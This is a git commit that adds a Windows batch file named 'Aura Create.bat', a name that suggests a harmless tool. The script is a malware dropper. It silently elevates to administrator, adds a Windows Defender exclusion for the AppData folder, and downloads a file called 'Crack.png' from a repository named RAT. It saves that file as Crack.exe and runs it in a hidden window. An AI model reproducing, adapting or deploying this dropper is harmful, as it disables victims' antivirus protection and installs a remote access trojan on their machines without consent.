1411dd7a89c1ce246d08c1f47716dbe87608c221
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-02 17:21:00 -0400

    Add files via upload

---
+++ Aura Create.bat
@@ -0,0 +1,24 @@
+@echo off
+set FILE="C:\Users\GLICHED\AppData\Roaming\Windows\System32.exe"
+if exist %FILE% (
+    exit /b
+)
+ping -n 1 8.8.8.8 >nul 2>&1
+if errorlevel 1 (
+    timeout /t 5 /nobreak >nul 2>&1
+    goto CheckInternet
+)
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
+set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
+start "" "%TARGET_FILE%"
+exit
+:: Made by GLICHED 
+:: v1
